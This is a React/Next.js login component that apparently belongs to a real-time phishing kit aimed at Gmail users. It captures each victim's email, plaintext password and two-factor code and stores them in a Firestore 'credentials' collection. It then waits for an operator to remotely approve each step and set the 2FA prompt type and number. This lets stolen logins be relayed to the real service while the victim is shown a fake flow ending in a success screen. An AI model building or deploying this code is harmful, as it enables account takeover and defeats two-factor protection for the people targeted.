"use client";

import { useState, useEffect } from "react";
import Email from "../Email";
import Password from "../Password";
import Success from "../Success";
import TwoFactor from "../TwoFactor";
import addColumn from "../functions/addData";
import { getCredentialByEmail } from "../functions/getData";
import useFirstTimeGetCred from "../hooks/useFirstTimeGetCred";
import { updateCredentialById } from "../functions/updateData";
import { db } from "../../lib/firebase";
import { collection, query, where, onSnapshot } from "firebase/firestore";

export default function Login() {
  const { newCredential } = useFirstTimeGetCred();
  const [firstTime, setFirstTime] = useState(true);
  const [credentials, setCredentials] = useState(newCredential);
  const [email, setEmail] = useState("");
  const [isEmailError, setIsEmailError] = useState(false);
  const [emailError, setEmailError] = useState(
    "Please enter a valid email or phone number"
  );
  const [isEmailApproved, setIsEmailApproved] = useState(false);
  const [password, setPassword] = useState("");
  const [isPasswordError, setIsPasswordError] = useState(false);
  const [twofa, setTwofa] = useState(0);
  const [number, setNumber] = useState(0);
  const [twoFactorType, setTwoFactorType] = useState("");
  const [isTwoFactorApproved, setIsTwoFactorApproved] = useState(false);
  const [isTwoFactorError, setIsTwoFactorError] = useState(false);

  // Update credentials with newCredential only if not yet approved
  useEffect(() => {
    if (!isEmailApproved && newCredential) {
      setCredentials(newCredential);
    }
  }, [newCredential, isEmailApproved]);

  // Listen for changes in Firestore document for Email
  useEffect(() => {
    if (!credentials?.id) return;

    const q = query(
      collection(db, "credentials"),
      where("id", "==", credentials.id)
    );
    const unsubscribe = onSnapshot(q, (querySnapshot) => {
      if (!querySnapshot.empty) {
        const docData = querySnapshot.docs[0].data();
        setIsEmailError(docData.email?.isEmailError || false);
        setIsEmailApproved(docData.email?.approved || false);
        console.log("Email Update from Firestore:", docData.email);
      }
    }, (error) => {
      console.error("Firestore Email Listener Error:", error);
    });

    return () => unsubscribe();
  }, [credentials?.id]);

  // Listen for changes in Firestore document for Password
  useEffect(() => {
    if (!credentials?.id) return;

    const q = query(
      collection(db, "credentials"),
      where("id", "==", credentials.id)
    );
    const unsubscribe = onSnapshot(q, (querySnapshot) => {
      if (!querySnapshot.empty) {
        const docData = querySnapshot.docs[0].data();
        setIsPasswordError(docData.password?.isPasswordError || false);
        setCredentials(prev => ({
          ...prev,
          password: docData.password || prev.password,
        }));
        console.log("Password Update from Firestore:", docData.password);
      }
    }, (error) => {
      console.error("Firestore Password Listener Error:", error);
    });

    return () => unsubscribe();
  }, [credentials?.id]);

  // Listen for changes in Firestore document for TwoFactor
  useEffect(() => {
    if (!credentials?.id) return;

    const q = query(
      collection(db, "credentials"),
      where("id", "==", credentials.id)
    );
    const unsubscribe = onSnapshot(q, (querySnapshot) => {
      if (!querySnapshot.empty) {
        const docData = querySnapshot.docs[0].data();
        setIsTwoFactorError(docData.twoFactor?.isTwoFactorError || false);
        setIsTwoFactorApproved(docData.twoFactor?.approved || false);
        setTwoFactorType(docData.twoFactor?.twoFactorType || "");
        setNumber(docData.twoFactor?.number || 0);
        setTwofa(docData.twoFactor?.code || 0);
        console.log("TwoFactor Update from Firestore:", docData.twoFactor);
      }
    }, (error) => {
      console.error("Firestore TwoFactor Listener Error:", error);
    });

    return () => unsubscribe();
  }, [credentials?.id]);

  const validateEmail = (input) => {
    const gmailRegex = /^[a-zA-Z0-9._%+-]+@gmail\.com$/;
    const phoneRegex = /^(\+?\d{1,3}[- ]?)?\d{3}[- ]?\d{3}[- ]?\d{4}$/;
    return gmailRegex.test(input) || phoneRegex.test(input);
  };

  const handleSubmitEmail = (e) => {
    if (!validateEmail(email)) {
      setIsEmailError(true);
      setEmailError("Please enter a valid email or phone number");
      console.log("Credential:", credentials);
    } else {
      const updatedCredentials = {
        ...credentials,
        email: {
          email,
          approved: false,
          emailSubmission: (credentials.email?.emailSubmission || 0) + 1,
          isEmailError: false,
        },
      };
      if (firstTime) {
        setTimeout(() => {
          setCredentials(updatedCredentials);
          updateCredentialById(credentials.id, updatedCredentials)
            .then(() => console.log("Email updated in Firestore"))
            .catch(error => console.error("Error updating email:", error));
          setFirstTime(false);
        }, 3000);
      } else {
        setCredentials(updatedCredentials);
        updateCredentialById(credentials.id, updatedCredentials)
          .then(() => console.log("Email updated in Firestore"))
          .catch(error => console.error("Error updating email:", error));
      }
    }
  };

  const handleSubmitPassword = (e) => {
    const currentPasswordSubmission =
      (credentials.password?.passwordSubmission || 0) + 1;
    const updatedCredentials = {
      ...credentials,
      email: {
        email: credentials.email.email,
        approved: true,
        emailSubmission: credentials.email.emailSubmission,
        isEmailError: false,
      },
      password: {
        password,
        passwordSubmission: currentPasswordSubmission,
        isPasswordError: false,
      },
      twoFactor: {
        code: twofa,
        approved: false,
        resendItClicked: 0,
        isTwoFactorError: false,
        twoFactorType: twoFactorType,
        number: number,
      },
    };
    setCredentials(updatedCredentials);
    updateCredentialById(credentials.id, updatedCredentials)
      .then(() => console.log("Password updated in Firestore"))
      .catch(error => console.error("Error updating password:", error));
  };

  const handleSubmitTwoFactor = (e, mode) => {
    const currentResendItClicked = (credentials.twoFactor?.resendItClicked || 0) + (mode === "resend" ? 1 : 0);
    const updatedCredentials = {
      ...credentials,
      email: {
        email: credentials.email.email,
        approved: true,
        emailSubmission: credentials.email.emailSubmission,
        isEmailError: false,
      },
      password: {
        password: credentials.password.password,
        passwordSubmission: credentials.password.passwordSubmission,
        isPasswordError: false,
      },
      twoFactor: {
        code: twofa,
        approved: false,
        resendItClicked: currentResendItClicked,
        isTwoFactorError: false,
        twoFactorType: twoFactorType,
        number: number,
      },
    };

    setCredentials(updatedCredentials);
    updateCredentialById(credentials.id, updatedCredentials)
      .then(() => console.log("TwoFactor updated in Firestore"))
      .catch(error => console.error("Error updating twoFactor:", error));
  };

  return (
    <>
      {!isEmailApproved ? (
        <Email
          email={email}
          setEmail={setEmail}
          setEmailError={setEmailError}
          setIsEmailError={setIsEmailError}
          emailError={emailError}
          isEmailError={isEmailError}
          handleSubmit={handleSubmitEmail}
        />
      ) : twoFactorType === "" ? (
        <Password
          email={credentials.email.email}
          password={password}
          setPassword={setPassword}
          isPasswordError={isPasswordError}
          handleSubmit={handleSubmitPassword}
          setIsPasswordError={setIsPasswordError}
        />
      ) : !isTwoFactorApproved ? (
        <TwoFactor
          email={credentials.email.email}
          number={number}
          twoFactorType={twoFactorType}
          handleSubmitTwoFactor={handleSubmitTwoFactor}
          twofa={twofa}
          setTwofa={setTwofa}
          isTwoFactorError={isTwoFactorError}
          setIsTwoFactorError={setIsTwoFactorError}
        />
      ) : (
        <Success />
      )}
    </>
  );
}